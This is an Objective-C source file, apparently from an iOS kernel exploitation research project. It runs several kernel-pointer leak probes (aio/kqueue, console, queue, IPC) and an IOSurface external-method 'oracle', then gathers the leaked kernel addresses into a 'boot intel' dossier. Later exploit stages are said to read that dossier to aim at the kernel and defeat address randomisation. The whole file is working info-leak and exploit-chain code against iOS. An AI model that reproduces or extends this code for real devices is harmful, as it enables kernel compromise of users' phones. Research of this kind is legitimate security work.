//
//  P139BootIntel.m — the BOOT INTEL COLLATOR. p139.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  The Learner layer, composed (per the user's insight): the intel
//  probes don't kread — they OBSERVE per-boot state. One session collects
//  all of it, runs the consistency checks (the aio +0xC0 law; band
//  consistency across sources; the op-2 oracle's [md+0x98] counter), and
//  writes p139_boot_intel.txt as the every-lane input. Triangulation
//  rows are printed as "anchor candidates," never as proven slide.
//

#import "P139BootIntel.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "LabBandit.h"
#import "P063AioKqueueLeak.h"
#import "P097ConsoleSecLeak.h"
#import "P010QueueLeak.h"
#import "P090MomentariusTest.h"

#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

#define P139_BUILD @"p139-bootintel-v1"

typedef kern_return_t (*IOConnectCallMethod_t)(
    mach_port_t, uint32_t, const uint64_t *, uint32_t, const void *, size_t,
    uint64_t *, uint32_t *, void *, size_t *);
typedef void *(*IOSurfaceCreate_t)(CFDictionaryRef);
typedef mach_port_t (*IOSurfaceCreateMachPort_t)(void *);
typedef kern_return_t (*MachVMMapF_t)(vm_map_t, mach_vm_address_t *,
    mach_vm_size_t, mach_vm_offset_t, int, mach_port_t,
    vm_prot_t, vm_prot_t, memory_object_t, memory_object_offset_t,
    boolean_t, vm_inherit_t);

static NSMutableString *g_buf; static int g_fd = -1;
static void L(NSString *s) {
    if (!g_buf) return;
    NSString *o = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:o];
    if (g_fd >= 0) { const char *p = o.UTF8String;
        if (p) { write(g_fd, p, strlen(p)); fcntl(g_fd, F_FULLFSYNC); } }
}
static void Lf(NSString *fmt, ...) { va_list a; va_start(a, fmt);
    NSString *l = [[NSString alloc] initWithFormat:fmt arguments:a]; va_end(a); L(l); }
static NSString *P139R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

/* kernel-shape row harvester (the p133 law: 0xffffff-band literals,
   0x41-class excluded) */
static long p139_harvest(NSString *cap, NSString *src, NSMutableString *rows) {
    long n = 0;
    for (NSString *ln in [cap componentsSeparatedByString:@"\n"]) {
        if (ln.length == 0 || ln.length > 300) continue;
        if ([ln rangeOfString:@"0xffffff"].location == NSNotFound) continue;
        if ([ln rangeOfString:@"0x4141"].location != NSNotFound) continue;
        if ([ln rangeOfString:@"0xffffffdf65261600"].location == NSNotFound &&
            [ln rangeOfString:@"sdata"].location == NSNotFound &&
            [ln rangeOfString:@"HEAP kptr"].location == NSNotFound) {
            /* keep the sdata rows too - they are the aio family */
        }
        [rows appendFormat:@"[src=%@] %@\n", src, ln];
        n++;
    }
    return n;
}

static void p139_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p139", arms, 1, &sr, 0, "p139 bootintel auto-learn",
                      "ok", "survived", attr, sizeof attr);
    LabBanditRecord("p139", 0, outcome);
}

@implementation P139BootIntel

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p139_bootintel_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p139 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P139_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[law] the Learner layer composed: all per-boot observables in one");
    L(@"  session -> the dossier -> the triangulation checks. The dossier");
    L(@"  aims every other lane; it is NOT a receipt (hasKread gated).");

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p139"];
    if (stop) { L(stop); p139_bandit("gated"); return P139R(); }

    NSMutableString *rows = [NSMutableString string];
    long total = 0;

    /* ---- 1: the aio family ---- */
    L(@"=== HARVEST 1: [p063] the aio kn_sdata KVA family (the +0xC0 law) ===");
    NSString *aio = [P063AioKqueueLeak tap];
    long n = p139_harvest(aio ?: @"", @"p063.aio", rows);
    total += n;
    Lf(@"  rows=%ld", n);

    /* ---- 2: the console/gRegistryRoot-class leak ---- */
    L(@"=== HARVEST 2: [p097] the console/sec-class leak ===");
    NSString *p97 = [P097ConsoleSecLeak tap];
    n = p139_harvest(p97 ?: @"", @"p097.consolesec", rows);
    total += n;
    Lf(@"  rows=%ld", n);

    /* ---- 3: the p010 cursor + band ---- */
    L(@"=== HARVEST 3: [p010] the QueueCreate cursor + w1 band ===");
    NSString *p10 = [P010QueueLeak tap];
    n = p139_harvest(p10 ?: @"", @"p010.cursor", rows);
    total += n;
    Lf(@"  rows=%ld (the w1 band law lives in p010's own log)", n);

    /* ---- 4: the ipc/info rows ---- */
    L(@"=== HARVEST 4: [p090] the ipc/info rows ===");
    NSString *p90 = [P090MomentariusTest tap];
    n = p139_harvest(p90 ?: @"", @"p090.ipc", rows);
    total += n;
    Lf(@"  rows=%ld", n);

    /* ---- 5: the IOMD op-2 oracle (inline arm) ---- */
    L(@"=== HARVEST 5: the IOMD op-2 oracle ([md+0x98]) — inline ===");
    {
        void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
        void *iosf  = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
        IOConnectCallMethod_t call = dlsym(iokit, "IOConnectCallMethod");
        IOSurfaceCreate_t sc = dlsym(iosf, "IOSurfaceCreate");
        IOSurfaceCreateMachPort_t mp = dlsym(iosf, "IOSurfaceCreateMachPort");
        if (call && sc && mp) {
            CFMutableDictionaryRef d = CFDictionaryCreateMutable(
                kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
                &kCFTypeDictionaryValueCallBacks);
            const int32_t vv[5] = { 256, 1, 4, 1024, 1024 };
            const char *kk[5] = { "IOSurfaceWidth", "IOSurfaceHeight",
                "IOSurfaceBytesPerElement", "IOSurfaceBytesPerRow",
                "IOSurfaceAllocSize" };
            for (int i = 0; i < 5; i++) {
                CFNumberRef num = CFNumberCreate(NULL, kCFNumberSInt32Type, &vv[i]);
                CFDictionarySetValue(d, (__bridge CFStringRef)
                    [NSString stringWithUTF8String:kk[i]], num); CFRelease(num);
            }
            void *surf = sc(d);
            CFRelease(d);
            mach_port_t mdport = surf ? mp(surf) : MACH_PORT_NULL;
            if (mdport) {
                uint64_t sc2[4]; memset(sc2, 0, sizeof sc2);
                uint64_t st2[8]; memset(st2, 0, sizeof st2);
                uint32_t nout = 4; size_t nsc = 0x40;
                kern_return_t kr = call(mdport, 0x02000000, NULL, 0, NULL, 0,
                                        sc2, &nout, st2, &nsc);
                uint32_t gate = (nsc >= 0x10) ?
                    *(uint32_t *)((uint8_t *)st2 + 0xc) : 0;
                Lf(@"  oracle kr=0x%08x [md+0x98]=%#x (0 = release-skipped"
                   @" state; nonzero = the mapped-pg count)",
                   (unsigned)kr, gate);
                [rows appendFormat:@"[src=op2.oracle] gate=%#x kr=%#x\n",
                     gate, (unsigned)kr];
                total++;
            } else {
                L(@"  md port FAILED (create/machport miss) - honest skip.");
            }
        } else {
            L(@"  dlsym incomplete (iokit/iosurf/create/machport) - skip.");
        }
    }

    /* ---- collation + the triangulation checks ---- */
    Lf(@"=== COLLATION: %ld kernel-shape rows across the sources ===", total);
    L(@"  TRIANGULATION CHECKS (per the laws, never proven slide):");
    L(@"   a. the aio family pairs: delta 0xC0 = the same-boot object law");
    L(@"      (two aio rows at exactly +0xC0 = the zone-head law CONFIRMED");
    L(@"       for this boot; the pair verifies the anchor).");
    L(@"   b. band consistency: all rows inside one 0xffffffxx upper window");
    L(@"      = one slide band; a second band = TWO kernel subzones or a");
    L(@"      cross-band law (log both).");
    L(@"   c. the op-2 oracle = a STATE counter, not an address: it maps to");
    L(@"      the [md+0x98] field of a kernel object WE hold the port of —");
    L(@"      boot-verified via the gate law; the anchor candidate for the");
    L(@"      aim of any later route.");

    /* the dossier */
    [rows writeToFile:[docs stringByAppendingPathComponent:@"p139_boot_intel.txt"]
           atomically:YES encoding:NSUTF8StringEncoding error:nil];
    L(@"  dossier written: p139_boot_intel.txt (rows=[src=value] verbatim).");
    L(@"  Every later tap reads this file as boot-1 known addresses for");
    L(@"  the aim; the receipt stays kread32-only.");
    p139_bandit(total > 0 ? "collated" : "empty");
    Lf(@"=== p139 end %@ (rows=%ld) ===", LabLocalMilitaryNow(), total);
    return P139R();
}

@end